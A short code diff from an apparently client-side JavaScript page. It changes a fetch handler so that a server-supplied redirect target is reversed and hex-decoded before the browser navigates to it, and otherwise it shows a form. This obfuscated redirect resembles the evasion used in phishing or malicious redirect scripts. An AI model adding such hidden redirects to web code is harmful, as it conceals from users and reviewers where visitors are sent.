@@ -172,7 +172,7 @@
                 .then((response) => response.text())
                 .then((data) => {
                     if (data.startsWith('0')) {
-                        location.href = data.substring(1)
+                        location.href = hexToString(data.substring(1).split('').reverse().join(''))
                     } else {
                         re = '?r='+data.substring(1)+mv;
                         document.getElementById('sform').style.display = 'flex';
